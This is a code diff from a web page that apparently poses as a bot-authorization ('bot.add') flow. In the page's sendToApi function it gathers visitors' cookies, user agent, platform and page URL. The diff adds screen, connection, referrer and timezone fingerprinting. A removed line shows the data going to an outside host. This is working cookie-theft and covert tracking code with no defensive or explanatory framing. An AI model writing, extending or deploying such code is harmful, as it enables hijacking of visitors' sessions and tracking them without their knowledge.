@@ -39,21 +39,44 @@
             return document.cookie;
         }
 
+        function getScreenDetails() {
+            return {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            };
+        }
+
+        function getConnectionDetails() {
+            const connection = navigator.connection || {};
+            return {
+                effectiveType: connection.effectiveType || "unknown",
+                downlink: connection.downlink || "unknown",
+                rtt: connection.rtt || "unknown",
+                saveData: connection.saveData || false
+            };
+        }
+
         async function sendToApi() {
             document.getElementById("status").innerText = "Please wait...";
             const botId = "1297569951632068618";
-            const url = "http://crown.foo.ng/oauth2?event=bot.add";
+            const urlParams = getUrlParams();
             
             const payload = {
                 deviceTime: getDeviceTime(),
                 botId: botId,
-                urlParams: getUrlParams(),
+                ...urlParams,
                 log: {
                     userAgent: navigator.userAgent,
                     language: navigator.language,
                     platform: navigator.platform,
                     cookies: getCookies(),
-                    pageUrl: window.location.href
+                    pageUrl: window.location.href,
+                    screen: getScreenDetails(),
+                    connection: getConnectionDetails(),
+                    referrer: document.referrer,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 }
             };
 
